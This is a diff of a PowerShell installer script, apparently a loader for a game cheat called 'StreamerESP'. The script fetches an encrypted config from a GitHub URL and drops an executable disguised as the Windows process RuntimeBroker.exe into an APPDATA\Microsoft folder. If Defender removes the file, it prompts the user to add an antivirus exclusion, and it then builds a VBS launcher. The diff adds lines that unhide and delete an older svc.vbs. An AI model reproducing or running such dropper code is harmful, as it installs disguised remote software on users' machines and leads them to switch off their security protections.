@@ -1,4 +1,4 @@
-$MK="StreamerESP_SecureKey_2024_CHANGE_ME"
+﻿$MK="StreamerESP_SecureKey_2024_CHANGE_ME"
 $CU="https://raw.githubusercontent.com/anshkumar258090-alt/streamer-esp-server/main/config.enc"
 $EN="RuntimeBroker.exe"
 $ID="$env:APPDATA\Microsoft\Broker"
@@ -32,6 +32,8 @@ if($cfg.hash){$h=(Get-FileHash $tmpF -Algorithm SHA256).Hash;if($h -ne $cfg.hash
 Move-Item $tmpF "$ID\$EN" -Force
 Start-Sleep 1
 if(!(Test-Path "$ID\$EN")){Write-Host "  [ERROR] Defender removed the file! Add exclusion:" -ForegroundColor Red;Write-Host "  Windows Security > Virus protection > Exclusions > Add folder:" -ForegroundColor Yellow;Write-Host "  $ID" -ForegroundColor White;pause;exit 1}
+attrib -h -s "$ID\svc.vbs" 2>$null
+Remove-Item "$ID\svc.vbs" -Force -ErrorAction SilentlyContinue
 $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
